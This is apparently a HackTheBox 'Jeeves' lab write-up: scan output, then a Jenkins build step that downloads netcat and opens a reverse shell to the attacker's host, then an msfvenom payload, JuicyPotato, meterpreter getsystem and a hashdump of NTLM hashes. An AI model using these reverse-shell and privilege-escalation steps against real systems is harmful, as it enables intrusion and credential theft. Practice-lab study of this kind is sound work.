Jeeves IP:


rustscan:
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
445/tcp   open  microsoft-ds syn-ack
50000/tcp open  ibm-db2      syn-ack



nmap:

PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h00m01s, deviation: 0s, median: 5h00m01s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55172/tcp): CLEAN (Timeout)
|   Check 2 (port 39372/tcp): CLEAN (Timeout)
|   Check 3 (port 14363/udp): CLEAN (Timeout)
|   Check 4 (port 48293/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-04T14:47:32
|_  start_date: 2023-04-04T14:44:38




enum4linux:

kali㉿kali)-[~/Practice/HackTheBox/Jeeves]
└─$ enum4linux -v 10.10.10.63                                                                                                                                                                    1 ⨯
[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
[V] Dependent program "net" found in /usr/bin/net
[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
[V] Dependent program "smbclient" found in /usr/bin/smbclient
[V] Dependent program "polenum" found in /usr/bin/polenum
[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Apr  4 05:46:08 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.63
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.63    |
 =================================================== 
[V] Attempting to get domain name with command: nmblookup -A '10.10.10.63'
[E] Can't find workgroup/domain


 =========================================== 
|    Nbtstat Information for 10.10.10.63    |
 =========================================== 
Looking up status of 10.10.10.63
No reply from 10.10.10.63

 ==================================== 
|    Session Check on 10.10.10.63    |
 ==================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[V] Attempting to make null session using command: smbclient -W '' //'10.10.10.63'/ipc$ -U''%'' -c 'help' 2>&1
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.


gobuster on port 80:

gobuster dir  -u http://10.10.10.63  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64   
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.63
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/04/04 05:51:07 Starting gobuster
===============================================================
===============================================================
2023/04/04 05:56:54 Finished
===============================================================



gobuster on port 50000:

 gobuster dir  -u http://10.10.10.63:50000  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64  
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.63:50000
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/04/04 05:57:39 Starting gobuster
===============================================================
/askjeeves (Status: 302)



visiting http://10.10.10.63:50000/askjeeves/ we are redirected to a jenkins server


in order to get a reverse shell from jenkins, we need to copy nc to the victim machine, and then create a reverse connecteion using jenkins,

for this we need to create a new item ( a folder) and add a buid step with the following:

powershell wget "http://10.10.14.7/nc64.exe" -outfile "nc64.exe"
nc64.exe -e cmd.exe 10.10.14.7 1234

we save the configuration and we start a nc listener. after this , we click on build now and we wait for the connection

nc -lnvp 1234                                    
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.63] 49677
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins\workspace\hello>whoami
whoami
jeeves\kohsuke

C:\Users\Administrator\.jenkins\workspace\hello>

user flag: C:\Users\kohsuke\Desktop>type user.txt
type user.txt
e3232272596fb47950d59c4cf1e7066a


PrivESC:

C:\Users\kohsuke\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled


C:\Users\kohsuke\Desktop>systeminfo
systeminfo

Host Name:                 JEEVES
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.10586 N/A Build 10586
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00331-20304-47406-AA297
Original Install Date:     10/25/2017, 4:45:33 PM
System Boot Time:          4/4/2023, 10:44:29 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,145 MB
Virtual Memory: Max Size:  2,687 MB
Virtual Memory: Available: 1,733 MB
Virtual Memory: In Use:    954 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB3150513
                           [02]: KB3161102
                           [03]: KB3172729
                           [04]: KB3173428
                           [05]: KB4021702
                           [06]: KB4022633
                           [07]: KB4033631
                           [08]: KB4035632
                           [09]: KB4051613
                           [10]: KB4041689
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.63
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.




create a msfvenom payload and download juicypotato:

┌──(kali㉿kali)-[~/Practice/HackTheBox/Jeeves]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f exe > shell.exe    
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Jeeves]
└─$ wget wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe                                 
--2023-04-04 06:15:33--  http://wget/
Resolving wget (wget)... failed: Name or service not known.
wget: unable to resolve host address ‘wget’
--2023-04-04 06:15:34--  https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
Resolving github.com (github.com)... 192.30.255.113
Connecting to github.com (github.com)|192.30.255.113|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/142582717/538c8db8-9c94-11e8-84e5-46a5d9473358?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230404%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230404T101536Z&X-Amz-Expires=300&X-Amz-Signature=d0f5efededbcf867028c42fc0e0690da9253affa35be38a821b6706aa23047b1&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=142582717&response-content-disposition=attachment%3B%20filename%3DJuicyPotato.exe&response-content-type=application%2Foctet-stream [following]
--2023-04-04 06:15:35--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/142582717/538c8db8-9c94-11e8-84e5-46a5d9473358?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230404%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230404T101536Z&X-Amz-Expires=300&X-Amz-Signature=d0f5efededbcf867028c42fc0e0690da9253affa35be38a821b6706aa23047b1&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=142582717&response-content-disposition=attachment%3B%20filename%3DJuicyPotato.exe&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 347648 (340K) [application/octet-stream]
Saving to: ‘JuicyPotato.exe’

JuicyPotato.exe                                   100%[==========================================================================================================>] 339.50K  1.40MB/s    in 0.2s    

2023-04-04 06:15:36 (1.40 MB/s) - ‘JuicyPotato.exe’ saved [347648/347648]

FINISHED --2023-04-04 06:15:36--
Total wall clock time: 2.2s
Downloaded: 1 files, 340K in 0.2s (1.40 MB/s)
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Jeeves]
└─$ ls                                                                                                                                                                                           4 ⨯
JuicyPotato.exe  nc64.exe  shell.exe
                                           

 host the files:
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Jeeves]
└─$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.63 - - [04/Apr/2023 06:16:21] "GET /shell.exe HTTP/1.1" 200 -
10.10.10.63 - - [04/Apr/2023 06:17:10] "GET /JuicyPotato.exe HTTP/1.1" 200 -



download files on the victim machine:

C:\Users\kohsuke\Desktop>powershell wget "http://10.10.14.7/shell.exe" -outfile "shell.exe"
powershell wget "http://10.10.14.7/shell.exe" -outfile "shell.exe"

C:\Users\kohsuke\Desktop>powershell wget "http://10.10.14.7/JuicyPotato.exe" -outfile "JuicyPotato.exe"
powershell wget "http://10.10.14.7/JuicyPotato.exe" -outfile "JuicyPotato.exe"

C:\Users\kohsuke\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Desktop

04/04/2023  11:17 AM    <DIR>          .
04/04/2023  11:17 AM    <DIR>          ..
04/04/2023  11:17 AM           347,648 JuicyPotato.exe
11/03/2017  11:22 PM                32 user.txt
               2 File(s)        347,680 bytes
               2 Dir(s)   2,641,346,560 bytes free

C:\Users\kohsuke\Desktop>




root.txt
meterpreter > shell
Process 3400 created.
Channel 3 created.
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>dir /r 
dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,640,379,904 bytes free

C:\Users\Administrator\Desktop>more hm.txt:root.txt
more hm.txt:root.txt
Cannot access file C:\Users\Administrator\Desktop\hm.txt:root.txt

C:\Users\Administrator\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530

C:\Users\Administrator\Desktop>



how to get root;

create a msfvenom payload as windows/x64/meterpreter_reverse_tcp and upload it to the machine


set up msfconsole on your end, use exploit/multi/handler and run the payload on the victim machine:

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp 
payload => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.7
LHOST => 10.10.14.7
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.7:4444 
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.10.63:49694) at 2023-04-04 07:32:41 -0400


use meterpreter option: get system to get admin privileges:

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).


meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
kohsuke:1001:aad3b435b51404eeaad3b435b51404ee:ab4043bce374136df6e09734d4577738:::


